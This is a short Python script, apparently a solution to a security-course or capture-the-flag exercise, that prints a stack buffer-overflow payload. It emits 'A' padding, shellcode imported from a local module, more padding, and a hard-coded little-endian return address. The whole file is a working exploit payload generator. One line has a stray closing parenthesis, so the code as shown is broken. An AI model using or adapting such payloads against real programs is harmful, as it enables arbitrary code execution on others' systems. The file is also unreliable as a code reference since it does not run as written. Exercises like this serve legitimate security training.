
import sys
from shellcode import shellcode
from struct import pack

sys.stdout.buffer.write(b'A' * 422)
sys.stdout.buffer.write(shellcode)

sys.stdout.buffer.write(b'A' * 591))
sys.stdout.buffer.write(pack("<I", 0xfffee40c))

